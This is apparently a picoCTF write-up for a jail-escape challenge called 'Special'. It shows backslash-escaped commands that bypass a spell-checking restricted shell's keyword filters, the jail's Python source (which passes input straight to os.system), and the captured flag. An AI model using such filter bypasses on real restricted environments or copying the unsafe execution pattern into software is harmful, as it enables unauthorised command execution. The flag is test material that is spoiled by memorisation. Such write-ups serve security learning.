# special

Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM) Start your instance to see connection details.

Additional details will be available after launching your challenge instance.


## Solucion

```
Special$ \e\c\h\o *
\e\c\h\o *
blargh


```

```
Special$ \c\a\t /usr/local/Special.py
\c\a\t /usr/local/Special.py
#!/usr/bin/python3

import os
from spellchecker import SpellChecker



spell = SpellChecker()

while True:
  cmd = input("Special$ ")
  rval = 0

  if cmd == 'exit':
    break
  elif 'sh' in cmd:
    print('Why go back to an inferior shell?')
    continue
  elif cmd[0] == '/':
    print('Absolutely not paths like that, please!')
    continue

  # Spellcheck
  spellcheck_cmd = ''
  for word in cmd.split():
    fixed_word = spell.correction(word)
    if fixed_word is None:
      fixed_word = word
    spellcheck_cmd += fixed_word + ' '

  # Capitalize
  fixed_cmd = list(spellcheck_cmd)
  words = spellcheck_cmd.split()
  first_word = words[0]
  first_letter = first_word[0]
  if ord(first_letter) >= 97 and ord(first_letter) <= 122:
    fixed_cmd[0] = chr(ord(spellcheck_cmd[0]) - 0x20)
  fixed_cmd = ''.join(fixed_cmd)

  try:
    print(fixed_cmd)
    os.system(fixed_cmd)
  except:
    print("Bad command!")
```

```
Special$ \/b\i\n/ls \-\R
\/b\i\n/ls \-\R
.:
blargh

./blargh:
flag.txt
```

```
Special$ \c\a\t \b\l\a\r\g\h/flag.txt
\c\a\t \b\l\a\r\g\h/flag.txt
picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}
```

## referencias

https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions

